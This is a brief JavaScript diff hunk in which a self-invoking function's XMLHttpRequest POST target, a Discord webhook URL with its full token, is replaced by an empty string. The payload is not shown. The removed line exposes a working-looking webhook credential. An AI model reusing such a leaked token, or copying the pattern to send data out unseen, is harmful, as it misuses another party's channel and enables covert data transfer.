@@ -1,7 +1,7 @@
 (function(){
 
     const request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/1035957373493329920/Upj7rW0Q-IVRx4obxJYIpQ_Cee9n6DrhumMQWI_ff06byvnCfzkCdXEThz8NYP1Uol-8");
+    request.open("POST", "");
   
     request.setRequestHeader('Content-type', 'application/json');
   
